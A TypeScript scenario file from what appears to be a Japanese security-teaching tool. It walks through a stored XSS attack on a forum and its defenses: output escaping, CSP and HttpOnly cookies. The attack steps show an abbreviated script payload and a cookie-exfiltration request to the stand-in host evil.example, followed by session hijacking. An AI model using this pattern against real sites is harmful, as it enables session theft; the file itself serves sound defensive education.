import { defineScenario } from '../types'

// Web掲示板：XSS（格納型）
// 図中のIPアドレスとドメイン（example.*）は、説明用に予約されたもので、実在のサーバを指しません。
// 攻撃のスクリプトは、仕組みが分かる程度に省略して載せています。
export const xss = defineScenario({
  id: 'xss',
  name: 'Web掲示板',
  threat: 'XSS（格納型）',
  actors: [
    { id: 'br', name: 'ブラウザ', sub: '利用者' },
    { id: 'sv', name: '掲示板サイト', sub: 'forum.example' },
    { id: 'atk', name: '攻撃者', sub: 'evil.example', attacker: true },
  ],
  summary: {
    normal: '利用者が掲示板に投稿し、一覧ページを閲覧する流れです。サイトは投稿をデータベースに保存し、ページのHTMLに埋め込んで返します。',
    attack: '攻撃者がスクリプトを含む投稿を保存させ、それを閲覧した利用者のブラウザでスクリプトを実行させて、セッションIDを盗みます（格納型XSS）。',
    defense: '出力時のエスケープでスクリプトをただの文字にし、CSPとHttpOnly属性で、万一の実行やCookieの持ち出しも防ぎます。',
  },
  steps: {
    normal: [
      {
        from: 'br',
        to: 'sv',
        kind: 'normal',
        label: 'POST /posts',
        title: '利用者が投稿する',
        fields: [
          ['メソッド', 'POST /posts'],
          ['本文', 'message=今日の勉強会は19時からです'],
          ['Cookie', 'SID=4c1d…（ログイン中のセッションID）'],
        ],
        note: '投稿した内容は、サーバのデータベースに保存されます。',
      },
      {
        from: 'sv',
        to: 'br',
        kind: 'normal',
        label: '投稿完了',
        title: '投稿を保存して一覧へ移動させる',
        fields: [
          ['応答', '303 See Other（/posts へ移動）'],
          ['保存した内容', '今日の勉強会は19時からです'],
        ],
        note: 'サーバは投稿を保存し、ブラウザを一覧ページへ移動させます。',
      },
      {
        from: 'br',
        to: 'sv',
        kind: 'normal',
        label: 'GET /posts',
        title: '一覧ページを開く',
        fields: [
          ['メソッド', 'GET /posts'],
          ['Cookie', 'SID=4c1d…'],
        ],
        note: 'ほかの利用者も、同じ一覧ページを開きます。',
      },
      {
        from: 'sv',
        to: 'br',
        kind: 'normal',
        label: '一覧ページ',
        title: '投稿をHTMLに埋め込んで返す',
        fields: [
          ['Content-Type', 'text/html; charset=UTF-8'],
          ['HTML', '<p>今日の勉強会は19時からです</p>'],
        ],
        note: 'サーバは保存した投稿を、HTMLの中に埋め込んで返します。投稿に「<」や「>」が含まれていたときにどう扱うかが、XSSの分かれ目です。',
        point: 'XSSの根本原因は、利用者が入力した文字列を、HTMLとして解釈される場所にそのまま出力することです。',
      },
    ],
    attack: [
      {
        from: 'atk',
        to: 'sv',
        kind: 'attack',
        label: 'スクリプトを投稿',
        title: 'スクリプトを含む投稿を保存させる',
        fields: [
          ['メソッド', 'POST /posts'],
          ['本文', 'message=<script>（document.cookie を evil.example へ送る処理）</script>'],
          ['ねらい', '閲覧した人のCookieを、攻撃者のサーバへ送らせる'],
        ],
        note: '掲示板が入力をそのまま保存するので、スクリプトがデータベースに格納されます。この種類を格納型XSS（蓄積型・持続型）と呼び、ページを閲覧した全員が被害を受けます。',
      },
      {
        from: 'br',
        to: 'sv',
        kind: 'normal',
        label: 'GET /posts',
        title: '利用者が一覧ページを開く',
        fields: [
          ['メソッド', 'GET /posts'],
          ['Cookie', 'SID=4c1d…'],
        ],
        note: '利用者は、いつもどおり掲示板を開くだけです。',
      },
      {
        from: 'sv',
        to: 'br',
        kind: 'attack',
        label: 'スクリプト入りのページ',
        title: 'スクリプトがそのまま埋め込まれる',
        fields: [
          ['HTML', '<p><script>（Cookieを送る処理）</script></p>'],
          ['エスケープ', 'していない'],
        ],
        note: 'サーバが投稿をエスケープせずに出力するので、ブラウザはそれを掲示板サイトのスクリプトとして実行します。同一オリジンのスクリプトとして動くため、このサイトのCookieにアクセスできます。',
      },
      {
        from: 'br',
        to: 'atk',
        kind: 'attack',
        label: 'Cookieを送信',
        title: 'セッションIDが攻撃者に届く',
        fields: [
          ['リクエスト', 'GET https://evil.example/c?SID=4c1d…'],
          ['Cookieの属性', 'HttpOnly なし（JavaScriptから読める）'],
        ],
        note: 'スクリプトは画像の読み込みなどを装って、Cookieを攻撃者のサーバへ送ります。利用者の画面には何も起きません。',
      },
      {
        from: 'atk',
        to: 'sv',
        kind: 'attack',
        label: '盗んだSIDで接続',
        title: '利用者になりすます',
        fields: [
          ['Cookie', 'SID=4c1d…（盗んだもの）'],
          ['結果', '利用者本人としてログインした状態になる（セッションハイジャック）'],
        ],
        note: '攻撃者は盗んだセッションIDを使って、利用者になりすまします。',
        point: 'XSSの被害はCookieの窃取だけではありません。偽の入力フォームを表示したり、利用者の操作になりすまして送信したりと、そのサイトで利用者ができることは何でもできてしまいます。',
      },
    ],
    defense: [
      {
        from: 'atk',
        to: 'sv',
        kind: 'attack',
        label: 'スクリプトを投稿',
        title: 'スクリプトを含む投稿を送る',
        fields: [
          ['本文', 'message=<script>（Cookieを送る処理）</script>'],
        ],
        note: '攻撃者の手口は同じです。入力の段階で弾く入力値の検証も有効ですが、根本対策は次の「出力時のエスケープ」です。',
      },
      {
        from: 'br',
        to: 'sv',
        kind: 'normal',
        label: 'GET /posts',
        title: '利用者が一覧ページを開く',
        fields: [
          ['メソッド', 'GET /posts'],
        ],
        note: '利用者の操作も同じです。',
      },
      {
        from: 'sv',
        to: 'br',
        kind: 'defense',
        label: 'エスケープ済みのページ',
        title: '出力するときにエスケープする',
        fields: [
          ['HTML', '<p>&lt;script&gt;（Cookieを送る処理）&lt;/script&gt;</p>'],
          ['CSP', "Content-Security-Policy: script-src 'self'"],
          ['Set-Cookie', 'SID=4c1d…; Secure; HttpOnly; SameSite=Lax'],
        ],
        note: '「<」を「&lt;」のように置き換えて出力するので、ブラウザは投稿をただの文字として表示します。さらにCSPで、サイト自身のファイル以外のスクリプト（ページに直接書かれたものを含む）の実行を禁止しています。',
        point: 'エスケープは、出力する場所に合わせて行います。HTMLの本文、属性値、JavaScriptの中、URLでは、必要な処理が異なります。',
      },
      {
        from: 'br',
        to: 'atk',
        kind: 'blocked',
        label: 'Cookie送信 → 遮断',
        title: '万一実行されても持ち出させない',
        fields: [
          ['CSP', 'ページに直接書かれたスクリプトは実行されない'],
          ['HttpOnly', 'document.cookie からSIDを読めない'],
        ],
        note: 'エスケープに漏れがあっても、CSPがスクリプトの実行を止め、HttpOnly属性がCookieの読み取りを防ぎます。複数の対策を重ねる多層防御の考え方です。',
      },
    ],
  },
  points: [
    '格納型XSSはサーバに保存されたスクリプトが閲覧者全員に実行される。反射型XSSはURLなどに含めたスクリプトがそのまま応答に反映される。DOM-based XSSはブラウザ側のJavaScriptの処理だけで起きる',
    '根本対策は出力時のエスケープ。補助的な対策として、入力値の検証、CSP、Cookieの HttpOnly 属性',
    'HttpOnly属性はCookieの窃取を防ぐが、XSSそのものは防げない',
    'WAFは攻撃のパターンを検知して遮断できるが、すり抜けもあるため、アプリケーション側の対策が前提',
  ],
  topology: {
    map: { br: 'pc', sv: 'ext1', atk: 'ext2' },
    devices: {
      ext1: { type: 'server', name: '掲示板サイト', sub: 'forum.example' },
      ext2: { type: 'laptop', name: '攻撃者', sub: 'evil.example' },
    },
    shields: ['ext1', 'pc'],
  },
})
